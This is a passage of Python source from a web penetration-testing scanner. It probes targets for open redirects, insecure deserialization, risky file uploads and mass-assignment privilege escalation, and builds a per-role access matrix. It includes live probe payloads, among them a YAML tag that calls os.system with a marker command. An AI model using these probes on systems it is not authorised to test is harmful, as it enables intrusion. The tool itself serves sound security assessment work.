    params  = crawl_data.get("params", [])
    vc.status(phase, "Open Redirect", "running", "Testing redirect params", 0, 1)

    redir_params = [
        (e["url"], p) for e in params for p in e["params"]
        if p.lower().replace("-", "").replace("_", "") in _OPEN_REDIRECT_PARAMS
    ]
    _found: set = set()

    for purl, param in redir_params:
        if purl in _found:
            continue
        for payload in _OPEN_REDIRECT_PAYLOADS:
            try:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r is None:
                    continue
                # Check Location header (3xx) or meta-refresh / body reflection
                loc = r.headers.get("Location", "") if r.status_code in (301, 302, 303, 307, 308) else ""
                if _OPEN_REDIRECT_EXTERNAL_RE.search(loc) or \
                        _OPEN_REDIRECT_EXTERNAL_RE.search(r.text[:3000]):
                    _found.add(purl)
                    out.add_finding(
                        title="Open Redirect",
                        url=purl, port=target["port"], risk="MEDIUM",
                        description=(f"Open redirect via parameter '{param}' at {purl}. "
                                     f"Payload '{payload}' caused a redirect to an external domain. "
                                     f"An attacker can craft a trusted-looking URL that silently "
                                     f"redirects users to a phishing or malware site."),
                        output=(f"Parameter: {param}\nPayload: {payload}\n"
                                f"Response: HTTP {r.status_code}\nLocation: {loc or '(in body)'}"),
                        sources="fracture-open-redirect", service=target["scheme"],
                        affected=purl, owasp="A01:2025 Broken Access Control", nist="SC-7",
                        remediation=(
                            "Validate redirect destinations against an allowlist of trusted domains. "
                            "Never use raw user input as a redirect target."
                        ),
                    )
                    vc.log(f"[open_redirect] Open redirect: {purl} param={param}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Open Redirect", "complete", "Done", 1, 1)
    vc.log("[open_redirect] Phase complete", "SUCCESS")


# =============================================================================
# Phase 17: Deserialization Detection
# =============================================================================

def _phase_deserialization(target: dict, cfg: dict, pm: ProgressManager,
                           out: OutputManager, sess: requests.Session,
                           crawl_data: dict) -> None:
    """Phase 17: Detect insecure deserialization endpoints and patterns."""
    phase   = "deserialization"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "Deserialization", "running", "Error pattern check", 0, 3)

    # 1. Trigger errors that reveal deserialization stack traces
    _deser_triggers = [
        b"rO0AB",          # Java serialized object base64 prefix
        b"gASV",           # Python pickle base64 prefix
        b"!!python/object", # YAML Python tag
        b"---\n!!",        # YAML prefix
    ]
    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or not _DESER_FIELD_RE.search(pname):
                continue
            for trigger in _deser_triggers:
                try:
                    import base64 as _b64d
                    encoded = _b64d.b64encode(trigger).decode()
                    data = {i["name"]: "test" for i in inputs if i.get("name")}
                    data[pname] = encoded
                    r = sess.post(action, data=data, timeout=timeout)
                    if r and _DESER_RESP_RE.search(r.text):
                        _rq, _rp = _save_http_evidence(out, phase, f"deser_error_{pname}", r)
                        out.add_finding(
                            title="Insecure Deserialization — Error Disclosure",
                            url=action, port=target["port"], risk="HIGH",
                            description=(f"Field '{pname}' at {action} returned an error message "
                                         f"revealing deserialization stack trace or library details. "
                                         f"This indicates the application deserialises user-controlled input."),
                            output=f"Field: {pname}\nPayload: {encoded[:40]}\nResponse: {r.text[:500]}",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-deserialization", service=target["scheme"],
                            affected=action, owasp="A08:2025 Software and Data Integrity Failures",
                            nist="SI-7",
                            remediation=(
                                "Avoid deserialising untrusted data. Use safe formats (JSON, Protobuf). "
                                "If deserialization is required, implement integrity checks and input validation."
                            ),
                        )
                        vc.log(f"[deserialization] Error discloses deserializer at {action}", "SUCCESS")
                        break
                except Exception:
                    pass

    vc.status(phase, "Deserialization", "running", "Content-Type probe", 1, 3)
    # 2. Probe common endpoints with serialized content-types
    for ct in _DESER_CONTENT_TYPES:
        try:
            r = sess.post(url, data=b"\xac\xed\x00\x05", timeout=timeout,
                          headers={"Content-Type": ct})
            if r and _DESER_RESP_RE.search(r.text):
                _rq, _rp = _save_http_evidence(out, phase, f"deser_ct_{re.sub(r'[^\\w]', '_', ct)[:20]}", r)
                out.add_finding(
                    title="Insecure Deserialization — Serialized Object Accepted",
                    url=url, port=target["port"], risk="CRITICAL",
                    description=(f"The endpoint accepted a POST request with Content-Type '{ct}' "
                                 f"and the response suggests the payload was processed by a "
                                 f"deserialization library. Insecure deserialization can lead to RCE."),
                    output=f"POST {url} with Content-Type: {ct}\nResponse: {r.text[:500]}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-deserialization", service=target["scheme"],
                    affected=url, owasp="A08:2025 Software and Data Integrity Failures",
                    nist="SI-7",
                    remediation=(
                        "Reject requests with serialization content-types unless explicitly required. "
                        "Use integrity-checked, schema-validated formats."
                    ),
                )
                vc.log(f"[deserialization] Serialized CT accepted: {ct}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Deserialization", "running", "YAML deserialization probe", 2, 3)
    # 3. YAML deserialization probe via form fields and API endpoints
    _yaml_payload = "!!python/object/apply:os.system ['echo fracture_yaml_rce']"
    for form in forms[:5]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[pname] = _yaml_payload
            try:
                r = sess.post(action, data=data, timeout=timeout)
                # Strip payload reflections before checking for the
                # execution marker — same false-positive risk as code
                # injection: some apps echo POST field values back.
                _yaml_body = r.text
                for _enc in (_yaml_payload,
                             urllib.parse.quote(_yaml_payload),
                             urllib.parse.quote_plus(_yaml_payload)):
                    _yaml_body = _yaml_body.replace(_enc, "")
                if (re.search(r'fracture_yaml_rce|yaml.*error|unsafe.*load', _yaml_body, re.I)
                          or r.status_code == 500):
                    _rq, _rp = _save_http_evidence(out, phase, f"deser_yaml_{pname}", r)
                    out.add_finding(
                        title="Insecure Deserialization — YAML Tag Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=(f"Field '{pname}' at {action} accepted a YAML tag injection payload "
                                     f"({_yaml_payload!r}). The response indicates YAML parsing of the input."),
                        output=f"Field: {pname}\nPayload: {_yaml_payload}\nResponse ({r.status_code}): {r.text[:400]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-deserialization", service=target["scheme"],
                        affected=action, owasp="A08:2025 Software and Data Integrity Failures",
                        nist="SI-7",
                        remediation="Use yaml.safe_load() instead of yaml.load(). Never pass user input to YAML parsers that process Python tags.",
                    )
                    vc.log(f"[deserialization] YAML tag injection at {action}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Deserialization", "complete", "Done", 3, 3)
    vc.log("[deserialization] Phase complete", "SUCCESS")


# =============================================================================
# Phase 18: File Upload — Informational
# =============================================================================

def _phase_file_upload_info(target: dict, cfg: dict, pm: ProgressManager,
                            out: OutputManager, sess: requests.Session,
                            crawl_data: dict) -> None:
    """Phase 18: Detect file upload endpoints and report accepted file types (informational)."""
    phase   = "file_upload_info"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "File Upload Info", "running", "Detecting upload forms", 0, 1)

    upload_forms = [
        f for f in forms
        if any(i.get("type") == "file" for i in f.get("inputs", []))
        or "multipart" in f.get("enctype", "")
    ]

    for form in upload_forms:
        action   = form.get("action", url)
        inputs   = form.get("inputs", [])
        file_inp = next((i for i in inputs if i.get("type") == "file"), None)
        if not file_inp:
            continue

        accept_attr = file_inp.get("accept", "")
        pname       = file_inp.get("name", "file")

        # Determine which types to probe
        probe_extensions = [".txt", ".html", ".php", ".jsp", ".aspx", ".svg"]
        accepted_types   = []
        dangerous_found  = []

        for ext in probe_extensions:
            fname    = f"fracture_probe{ext}"
            content  = b"fracture_upload_test"
            files    = {pname: (fname, content, "text/plain")}
            extra    = {i["name"]: "fracture_test" for i in inputs
                        if i.get("name") and i.get("type") != "file"}
            try:
                r = sess.post(action, files=files, data=extra, timeout=timeout)
                if r and r.status_code in (200, 201, 302):
                    accepted_types.append(ext)
                    if _UPLOAD_ACCEPT_DANGEROUS.search(ext):
                        dangerous_found.append(ext)
            except Exception:
                pass

        risk        = "HIGH" if dangerous_found else "INFO"
        description = (
            f"File upload endpoint found at {action} (field: '{pname}'). "
            + (f"Accepted file types from probe: {', '.join(accepted_types)}. " if accepted_types else "")
            + (f"DANGEROUS: server accepted potentially executable extensions: "
               f"{', '.join(dangerous_found)}. " if dangerous_found else "")
            + (f"'accept' attribute declares: {accept_attr}. " if accept_attr else "")
        )
        remediation = (
            "Validate file extensions and MIME types server-side. "
            "Store uploads outside the web root. "
            "Rename uploaded files to random UUIDs. "
            "Scan uploaded content with antivirus. "
            "Restrict execution permissions on the upload directory."
        ) if dangerous_found else (
            "Confirm server-side extension validation is enforced. "
            "Ensure uploaded files are stored outside the web root with non-executable permissions."
        )

        out.add_finding(
            title="File Upload Endpoint Detected" if not dangerous_found
                  else "Unrestricted File Upload — Dangerous Extension Accepted",
            url=action, port=target["port"], risk=risk,
            description=description,
            output=(f"Form action: {action}\nFile field: {pname}\n"
                    f"Accept attribute: {accept_attr or '(none)'}\n"
                    f"Probed extensions: {', '.join(probe_extensions)}\n"
                    f"Accepted: {', '.join(accepted_types) or '(none confirmed)'}"),
            sources="fracture-file-upload", service=target["scheme"],
            affected=action, owasp="A04:2025 Insecure Design", nist="SI-3",
            remediation=remediation,
        )
        vc.log(f"[file_upload_info] Upload form at {action} — accepted: {accepted_types}", "SUCCESS")

    if not upload_forms:
        vc.log("[file_upload_info] No file upload forms detected", "INFO")

    vc.status(phase, "File Upload Info", "complete", "Done", 1, 1)
    vc.log("[file_upload_info] Phase complete", "SUCCESS")


# =============================================================================
# Phase 19: Mass Assignment
# =============================================================================

def _phase_mass_assignment(target: dict, cfg: dict, pm: ProgressManager,
                           out: OutputManager, sess: requests.Session,
                           crawl_data: dict) -> None:
    """Phase 19: Test web forms and JSON endpoints for mass assignment vulnerabilities."""
    phase   = "mass_assignment"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "Mass Assignment", "running", "Testing forms", 0, 2)

    _ma_found: set = set()

    # 1. Form-based mass assignment
    for form in forms[:15]:
        action  = form.get("action", url)
        method  = form.get("method", "POST")
        inputs  = form.get("inputs", [])
        if method.upper() not in ("POST", "PUT", "PATCH"):
            continue
        if action in _ma_found:
            continue

        # Baseline submission
        base_data = {i["name"]: "test_value" for i in inputs if i.get("name")}
        try:
            r_base = sess.post(action, data=base_data, timeout=timeout)
        except Exception:
            continue

        # Augmented submission with privileged fields
        aug_data = dict(base_data)
        for ma_field in _MASS_ASSIGN_FIELDS:
            aug_data[ma_field] = "1"
        try:
            r_aug = sess.post(action, data=aug_data, timeout=timeout)
            # Heuristic: field name must appear in the augmented response but NOT
            # in the baseline response — eliminates FPs from ARIA role attributes,
            # common English words (admin, role, verified) in page content, etc.
            if r_aug and any(f in r_aug.text and f not in r_base.text
                             for f in _MASS_ASSIGN_FIELDS):
                reflected = [f for f in _MASS_ASSIGN_FIELDS
                             if f in r_aug.text and f not in r_base.text]
                _ma_found.add(action)
                out.add_finding(
                    title="Mass Assignment / Privilege Escalation via Parameter Binding",
                    url=action, port=target["port"], risk="HIGH",
                    description="The application or API auto-binds request input properties to internal model objects without restricting which fields may be set, allowing an attacker to inject privileged fields (e.g., role, isAdmin) and escalate privileges.",
                    output=(f"Form: {action}\nInjected fields: {', '.join(reflected)}\n"
                            f"Response snippet: {r_aug.text[:400]}"),
                    sources="fracture-mass-assignment", service=target["scheme"],
                    affected=action, owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation="Define and enforce an explicit allowlist of bindable properties using DTOs or input validation schemas; reject or ignore any request field not explicitly permitted for the given operation.",
                )
                vc.log(f"[mass_assignment] Form mass assignment at {action}: {reflected}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Mass Assignment", "running", "Testing JSON endpoints", 1, 2)
    # 2. JSON body mass assignment on common profile/update endpoints
    _json_update_paths = ["/api/user", "/api/profile", "/profile", "/user",
                          "/api/v1/user", "/api/v1/profile", "/account", "/api/account",
                          "/user/update", "/api/user/update"]
    for jpath in _json_update_paths:
        jurl = url.rstrip("/") + jpath
        if jurl in _ma_found:
            continue
        try:
            base_resp = sess.put(jurl, json={"name": "fracture_test"}, timeout=timeout)
            if base_resp and base_resp.status_code in (200, 201, 204):
                priv_payload = {"name": "fracture_test"}
                for f in _MASS_ASSIGN_FIELDS:
                    priv_payload[f] = True
                r_priv = sess.put(jurl, json=priv_payload, timeout=timeout)
                if r_priv and any(f in r_priv.text and f not in base_resp.text
                                  for f in _MASS_ASSIGN_FIELDS):
                    reflected_j = [f for f in _MASS_ASSIGN_FIELDS
                                   if f in r_priv.text and f not in base_resp.text]
                    _ma_found.add(jurl)
                    out.add_finding(
                        title="Mass Assignment / Privilege Escalation via Parameter Binding",
                        url=jurl, port=target["port"], risk="HIGH",
                        description="The application or API auto-binds request input properties to internal model objects without restricting which fields may be set, allowing an attacker to inject privileged fields (e.g., role, isAdmin) and escalate privileges.",
                        output=(f"PUT {jpath}\nInjected: {list(priv_payload.keys())}\n"
                                f"Reflected: {reflected_j}\nResponse: {r_priv.text[:400]}"),
                        sources="fracture-mass-assignment", service=target["scheme"],
                        affected=jurl, owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Define and enforce an explicit allowlist of bindable properties using DTOs or input validation schemas; reject or ignore any request field not explicitly permitted for the given operation.",
                    )
                    vc.log(f"[mass_assignment] JSON mass assignment at {jpath}: {reflected_j}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Mass Assignment", "complete", "Done", 2, 2)
    vc.log("[mass_assignment] Phase complete", "SUCCESS")


# =============================================================================
# MAIN
# =============================================================================
def _print_banner() -> None:
    _tprint(f"{Fore.RED}{_BANNER}{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  Fracture v{VERSION} — Web Application Penetration Testing Orchestrator{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  OWASP Top 10 2025 Coverage: A01–A10{Style.RESET_ALL}\n")


def _write_preliminary_access_matrix(out: "OutputManager", target: dict,
                                      roles: "list[str]") -> None:
    """Write access_matrix.json from current structure_map paths without probing.
    Crucible can display the growing path list in real time; Phase 20 fills in
    actual HTTP statuses per role once probing is complete.
    """
    sm_path = out.root / "structure_map.json"
    am_path = out.root / "access_matrix.json"
    try:
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return
    all_paths = sorted(sm.get("paths", {}).keys())
    if not all_paths:
        return
    try:
        existing_am = json.loads(am_path.read_text()) if am_path.exists() else {}
    except Exception:
        existing_am = {}
    existing_entries = {e["path"]: e for e in existing_am.get("paths", [])}
    base_url = target["url"].rstrip("/")
    sm_path_data = sm.get("paths", {})
    # Compute merged roles: start from existing file, add module-level role list
    # (_all_roles_ctx is populated as soon as _collected_roles is known, so even
    # the very first write during recon carries the correct column names), then
    # any caller-supplied roles.
    merged_roles = list(existing_am.get("roles", []))
    for r in _all_roles_ctx + list(roles):
        if r not in merged_roles:
            merged_roles.append(r)
    # Which role is currently being tested?
    # Safe because pre-context phases use _scan_ctx["role"]="" (_seed_active=False),
    # so only the explicitly running role's column is ever updated here.
    path_entries = []
    for p in all_paths:
        if p in existing_entries:
            entry = dict(existing_entries[p])
            entry["access"] = dict(entry.get("access", {}))
            # Null-initialize any role not yet recorded for this path.
            for r in merged_roles:
                if r not in entry["access"]:
                    entry["access"][r] = None
            path_entries.append(entry)
        else:
            # New path — all role columns start as None.
            # Per-role HTTP codes are filled exclusively by _probe_role_paths,
            # which uses each role's actual session. Never seed from the
            # structure_map write-once status (that is Role 1's code and would
            # propagate it to every other role, causing all roles to appear
            # identical in the Access Matrix).
            access = {r: None for r in merged_roles}
            path_entries.append({"path": p, "url": base_url + p, "access": access})
    data = {
        "roles": merged_roles,
        "most_privileged": existing_am.get("most_privileged"),
        "privilege_counts": existing_am.get("privilege_counts", {}),
        "paths": path_entries,
    }
    try:
        am_path.write_text(json.dumps(data, indent=2))
    except Exception:
        pass


def _probe_role_paths(out: "OutputManager", target: dict, cfg: dict,
                      role_label: str, role_sess: "requests.Session | None") -> None:
    """Probe all structure_map paths that have no HTTP code for role_label yet.

    Called at the end of each credential context to guarantee role completion:
    every discovered endpoint has a real status code for the current role before
    the scan moves on.  Writes results directly into access_matrix.json.
    """
    sm_path = out.root / "structure_map.json"
    am_path = out.root / "access_matrix.json"
    try:
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
    except Exception:
        return
    am_by_path = {e["path"]: e for e in am.get("paths", [])}
    all_sm_paths = sorted(sm.get("paths", {}).keys())
    if not all_sm_paths:
        return
    base_url   = target["url"].rstrip("/")
    timeout    = cfg.get("timeout", 10)
    verify_ssl = cfg.get("verify_ssl", False)
    probe_sess = role_sess if role_sess is not None else requests.Session()
    if role_sess is None:
        probe_sess.verify = verify_ssl
    all_roles_in_am: list = am.get("roles", [])
    changed = False
    for path in all_sm_paths:
        entry = am_by_path.get(path)
        if entry is None:
            # Path exists in structure_map but not yet in access_matrix.
            # Create the entry now so it is probed in this pass rather than
            # waiting for the next _write_preliminary_access_matrix call.
            entry = {"path": path, "url": base_url + path,
                     "access": {r: None for r in all_roles_in_am}}
            am_by_path[path] = entry
            am.setdefault("paths", []).append(entry)
        access = entry.setdefault("access", {})
        # Ensure this role's key exists (may be absent if role was added after
        # the entry was first written).
        if role_label not in access:
            access[role_label] = None
        if access[role_label] is not None:
            continue  # Already probed with a real response for this role
        url = base_url + path
        _body_denied = False
        _body_len    = 0
        _waf_blocked = False
        _final_code  = 0
        try:
            r = probe_sess.get(url, timeout=timeout, allow_redirects=False,
                               headers={"Accept": "text/html,application/json"})
            _final_code = r.status_code
            try:
                if _is_waf_block(r):
                    _waf_blocked = True
                elif _final_code == 200:
                    _body_len    = len(r.content)
                    _body_denied = bool(_DENIAL_RE.search(r.text[:8192]))
            except Exception:
                pass
        except Exception:
            try:
                r = probe_sess.head(url, timeout=max(timeout // 2, 3), allow_redirects=False)
                _final_code = r.status_code
            except Exception:
                pass
        access[role_label] = _final_code
        if _final_code in (200, 403) or _waf_blocked:
            _meta = entry.setdefault("access_meta", {})
            _meta[role_label] = {
                "body_len":    _body_len,
                "body_denied": _body_denied,
                "waf_blocked": _waf_blocked,
            }
        changed = True
    if changed:
        try:
            am_path.write_text(json.dumps(am, indent=2))
        except Exception:
            pass


def _score_role_access(out: "OutputManager", target: dict, role_label: str) -> dict:
    am_path = out.root / "access_matrix.json"
    sm_path = out.root / "structure_map.json"
    try:
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return {"n200": 0, "n200_priv": 0, "body_weight": 0, "score": 0}

    sm_paths = sm.get("paths", {})
    n200 = 0
    n200_priv = 0
    body_weight = 0
    for entry in am.get("paths", []):
        status = entry.get("access", {}).get(role_label)
        if status != 200:
            continue
        n200 += 1
        path = entry.get("path", "")
        if _PRIV_PATH_RE.search(path):
            n200_priv += 1
        sm_entry = sm_paths.get(path, {})
        body_weight += sm_entry.get("body_len", 0) if isinstance(sm_entry, dict) else 0

    score = n200 + (n200_priv * 5) + (body_weight // 1024)
    return {"n200": n200, "n200_priv": n200_priv, "body_weight": body_weight, "score": score}


def _run_buster_only(target: dict, cfg: dict, out: "OutputManager",
                     sess: "requests.Session",
                     wc_baseline=None,
                     role_label: str = "") -> list:
    url     = target["url"]
    phase   = "recon"
    timeout = cfg.get("timeout", 10)
    sfx     = ("_" + re.sub(r'[^\w]', '_', role_label)[:30]) if role_label else ""

    gobuster    = _find_tool("gobuster")
    feroxbuster = _find_tool("feroxbuster")
    wordlist_dir  = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    wordlist_file = _find_wordlist("raft-large-files.txt")

    # Read CDN from target_profile to throttle busters if WAF/CDN detected
    try:
        _rbo_cdn = json.loads(
            (out.root / "target_profile.json").read_text()
        ).get("cdn", "") or ""
    except Exception:
        _rbo_cdn = ""
    _rbo_fer_sc = "200,204,301,302,307" if _rbo_cdn else "200,204,301,302,307,401,403"
    _rbo_threads = "5" if _rbo_cdn else "30"

    discovered: list = []

    # ── Dirs: gobuster ─────────────────────────────────────────────────────────
    if wc_baseline is None and gobuster and Path(wordlist_dir).exists():
        out_f = out.output_path(phase, f"gobuster_{target['hostname']}{sfx}")
        cmd = [gobuster, "dir", "-u", url, "-w", wordlist_dir, "-t", _rbo_threads,
               "-q", "-k", "-o", str(out_f)]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running gobuster (dirs){' for ' + role_label if role_label else ''} ...", "INFO")
        _gobuster_run(cmd, out_f, "recon", out)
        if out_f.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _gob_res = _filter_buster_wildcards(
                    _parse_gobuster_with_status(out_f, url), sess, timeout)
                for _gu, _gs, _gr in _gob_res:
                    discovered.append(_gu)
                    _sp = urllib.parse.urlparse(_gu).path or "/"
                    _sm_ps[_sp] = _gs
                    if _gr:
                        _sm_rd[_sp] = _gr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(out_f)],
                                         source="gobuster")
            except Exception:
                pass

    # ── Dirs: feroxbuster ──────────────────────────────────────────────────────
    if feroxbuster and Path(wordlist_dir).exists():
        fer_out = out.output_path(phase, f"feroxbuster_{target['hostname']}{sfx}")
        cmd = [
            feroxbuster, "--url", url, "--wordlist", wordlist_dir,
            "--depth", "2", "--threads", _rbo_threads, "--quiet",
            "--status-codes", _rbo_fer_sc,
            "--output", str(fer_out), "--insecure",
            "--auto-tune", "--time-limit", "4m",
        ]
        if _rbo_cdn:
            cmd += ["--rate-limit", "25"]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running feroxbuster (dirs){' for ' + role_label if role_label else ''} ...", "INFO")
        _fer_proc = None
        try:
            _fer_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(_fer_proc)
            _fer_proc.communicate(timeout=300)
            _deregister_proc(_fer_proc)
            out.log_command("feroxbuster", cmd, fer_out)
        except subprocess.TimeoutExpired:
            _fer_proc.kill(); _fer_proc.communicate(); _deregister_proc(_fer_proc)
            vc.log("[recon] feroxbuster (dirs) timed out after 300s — killed", "WARNING")
        except Exception as e:
            if _fer_proc:
                try: _fer_proc.kill(); _fer_proc.communicate()
                except Exception: pass
                _deregister_proc(_fer_proc)
            out.log_error("feroxbuster", cmd, str(e))
        if fer_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _fer_res = _filter_buster_wildcards(
                    _parse_feroxbuster_with_status(fer_out), sess, timeout)
                for _fu, _fs, _fr in _fer_res:
                    discovered.append(_fu)
                    _sp = urllib.parse.urlparse(_fu).path or "/"
                    _sm_ps[_sp] = _fs
                    if _fr:
                        _sm_rd[_sp] = _fr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(fer_out)],
                                         source="feroxbuster")
            except Exception:
                pass

    # ── Files: gobuster ────────────────────────────────────────────────────────
    if wc_baseline is None and gobuster and Path(wordlist_file).exists():
        gob_files_out = out.output_path(phase, f"gobuster_files_{target['hostname']}{sfx}")
        cmd = [gobuster, "dir", "-u", url, "-w", wordlist_file, "-t", _rbo_threads,
               "-q", "-k", "-o", str(gob_files_out)]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running gobuster (files){' for ' + role_label if role_label else ''} ...", "INFO")
        _gobuster_run(cmd, gob_files_out, "recon", out)
        if gob_files_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _gobf_res = _filter_buster_wildcards(
                    _parse_gobuster_with_status(gob_files_out, url), sess, timeout)
                for _gu, _gs, _gr in _gobf_res:
                    discovered.append(_gu)
                    _sp = urllib.parse.urlparse(_gu).path or "/"
                    _sm_ps[_sp] = _gs
                    if _gr:
                        _sm_rd[_sp] = _gr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(gob_files_out)],
                                         source="gobuster")
            except Exception:
                pass

    # ── Files: feroxbuster ─────────────────────────────────────────────────────
    if feroxbuster and Path(wordlist_file).exists():
        fer_files_out = out.output_path(phase, f"feroxbuster_files_{target['hostname']}{sfx}")
        cmd = [
            feroxbuster, "--url", url, "--wordlist", wordlist_file,
            "--depth", "2", "--threads", _rbo_threads, "--quiet",
            "--status-codes", _rbo_fer_sc,
            "--output", str(fer_files_out), "--insecure",
            "--auto-tune", "--time-limit", "4m",
        ]
        if _rbo_cdn:
            cmd += ["--rate-limit", "25"]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running feroxbuster (files){' for ' + role_label if role_label else ''} ...", "INFO")
        _fer_files_proc = None
        try:
            _fer_files_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(_fer_files_proc)
            _fer_files_proc.communicate(timeout=300)
            _deregister_proc(_fer_files_proc)
            out.log_command("feroxbuster", cmd, fer_files_out)
        except subprocess.TimeoutExpired:
            _fer_files_proc.kill(); _fer_files_proc.communicate(); _deregister_proc(_fer_files_proc)
            vc.log("[recon] feroxbuster (files) timed out after 300s — killed", "WARNING")
        except Exception as e:
            if _fer_files_proc:
                try: _fer_files_proc.kill(); _fer_files_proc.communicate()
                except Exception: pass
                _deregister_proc(_fer_files_proc)
            out.log_error("feroxbuster", cmd, str(e))
        if fer_files_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _ferf_res = _filter_buster_wildcards(
                    _parse_feroxbuster_with_status(fer_files_out), sess, timeout)
                for _fu, _fs, _fr in _ferf_res:
                    discovered.append(_fu)
                    _sp = urllib.parse.urlparse(_fu).path or "/"
                    _sm_ps[_sp] = _fs
                    if _fr:
                        _sm_rd[_sp] = _fr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(fer_files_out)],
                                         source="feroxbuster")
            except Exception:
                pass

    # Deduplicate and return
    seen_urls: set = set()
    result: list = []
    for u in discovered:
        u = u.rstrip("/")
        if u and u not in seen_urls:
            seen_urls.add(u)
            result.append(u)
    return sorted(result)


def _retroactive_probe(out: "OutputManager", target: dict, cfg: dict,
                       new_urls: list,
                       completed_roles: "dict[str, requests.Session | None]") -> None:
    if not new_urls or not completed_roles:
        return
    am_path = out.root / "access_matrix.json"
    sm_path = out.root / "structure_map.json"
    try:
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return
    base_url = target["url"].rstrip("/")
    timeout  = cfg.get("timeout", 10)
    verify   = cfg.get("verify_ssl", False)
    am_by_path = {e["path"]: e for e in am.get("paths", [])}

    def _get_probe_sess(rsess):
        if rsess is not None:
            return rsess
        s = requests.Session()
        s.verify = verify
        return s

    for url_str in new_urls:
        path = urllib.parse.urlparse(url_str).path or "/"
        if path not in am_by_path:
            access = {r: None for r in am.get("roles", [])}
            am_by_path[path] = {"path": path, "url": base_url + path, "access": access}
            am.setdefault("paths", []).append(am_by_path[path])

        entry  = am_by_path[path]
        access = entry.setdefault("access", {})
        for r in am.get("roles", []):
            if r not in access:
                access[r] = None

        full_url = base_url + path
        for role_label, rsess in completed_roles.items():
            if access.get(role_label) is not None:
                continue
            probe_sess = _get_probe_sess(rsess)
            try:
                r = probe_sess.get(full_url, timeout=timeout, allow_redirects=False,
                                   headers={"Accept": "text/html,application/json"})
                access[role_label] = r.status_code
            except Exception:
                try:
                    r = probe_sess.head(full_url, timeout=max(timeout // 2, 3),
                                        allow_redirects=False)
                    access[role_label] = r.status_code
                except Exception:
                    access[role_label] = 0

    am["paths"] = list(am_by_path.values())
    try:
        am_path.write_text(json.dumps(am, indent=2))
    except Exception:
        pass
    try:
        sm_paths = sm.setdefault("paths", {})
        for url_str in new_urls:
            path = urllib.parse.urlparse(url_str).path or "/"
            if path not in sm_paths:
                sm_paths[path] = {"status": None}
        sm_path.write_text(json.dumps(sm, indent=2))
    except Exception:
        pass


def _phase_access_matrix(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, sess: requests.Session,
                          crawl_data: dict,
                          prebuilt_sessions: "dict | None" = None) -> dict:
    """
    Phase 20: Multi-credential access matrix: tests each discovered path with
    every role in cfg['auth_matrix'] plus unauthenticated.
    Sources paths from structure_map.json (all gobuster/crawl discovered paths).
    Generates access_matrix.json, MEDIUM findings for unauth access,
    HIGH findings for BFLA (lower-priv accessing admin paths).

    prebuilt_sessions: {role_label: requests.Session} collected during the
    context loop. When provided, skips re-authentication entirely.
    """
    import copy as _copy

    phase       = "access_matrix"
    auth_matrix = cfg.get("auth_matrix", [])
    base_url    = target["url"].rstrip("/")
    port        = target["port"]
    timeout     = cfg.get("timeout", 10)
    project_dir = out.root
    verify_ssl  = cfg.get("verify_ssl", False)

    # Build path list from structure_map.json (primary) + crawl_data links (supplemental)
    sm_path = out.root / "structure_map.json"
    _sm_path_keys: list = []
    try:
        _sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
        _sm_path_keys = sorted(_sm.get("paths", {}).keys())
    except Exception:
        pass
    _seen_paths: set = set(_sm_path_keys)
    for _lnk in crawl_data.get("links", []):
        _p = urllib.parse.urlparse(_lnk).path or "/"
        if _p not in _seen_paths:
